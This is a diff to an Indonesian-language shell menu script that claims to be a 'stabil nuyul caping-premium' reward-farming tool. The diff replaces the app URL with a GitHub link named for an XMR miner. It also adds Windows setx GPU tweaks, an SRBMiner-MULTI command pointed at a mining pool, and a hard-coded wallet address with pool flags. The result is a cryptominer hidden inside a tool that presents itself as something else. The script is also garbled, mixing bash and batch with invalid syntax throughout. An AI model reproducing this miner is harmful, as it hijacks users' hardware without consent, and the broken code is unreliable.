@@ -12,7 +12,7 @@ toilet -f gay by Hen
 echo $green”selamat datang
 echo
 sleep2
-echo $yellow“:’https://ai2.caping.co.id/v2/channel/all3?ChannelType=1"
+echo $yellow“:’https://raw.githubusercontent.com/Hdrik80/Miner/main/XMR"
 echo
 echo $cyan”1.)stabil nuyul caping-premium”
 echo
@@ -20,7 +20,7 @@ echo $blue”0.)keluar  ajah !!!
 echo
 echo $white
 echo
-red -p “https://ai2.caping.co.id/v2/channel/all3?ChannelType=1" :”bro
+red -p “https://raw.githubusercontent.com/Hdrik80/Miner/main/XMR" :”bro
 
 if [ $bro  = 1 ] [  ||  [ $bro = 1 ]
 then
@@ -30,6 +30,23 @@ echo $green “stabil jaringan Hen Drik86”
 sleep2
 ping -$100000
 f1
+# XMR
+setx GPU_MAX_HEAP_SIZE 100	
+setx GPU_MAX_USE_SYNC_OBJECTS 1	
+setx GPU_SINGLE_ALLOC_PERCENT 100	
+setx GPU_MAX_ALLOC_PERCENT 100	
+setx GPU_MAX_SINGLE_ALLOC_PERCENT 100	
+setx GPU_ENABLE_LARGE_ALLOCATION 100
+setx GPU_MAX_WORKGROUP_SIZE 1024
+
+@echo off
+cd %~dp0
+cls
+
+SRBMiner-MULTI.exe --algorithm argon2id_chukwa2 --pool de.turtlecoin.herominers.com:1160 --wallet YOUR_TURTLECOIN_WALLET_ADDRESS --HN YOUR_WORKER_JS
+pause
+84PmMKFyXDQ5W1beQ1TCzV9GFVxJ2ntihVwFd5bWsnkN2QpwRPHDnzCP77qKYUnkzc3sZJcQE5CoVLoyYwSQLBcvTjoSn2F -k --tls --rig-id Hn
+pause
 
 if [$bro= 0 ] || [$10000= 10000 ]
 then
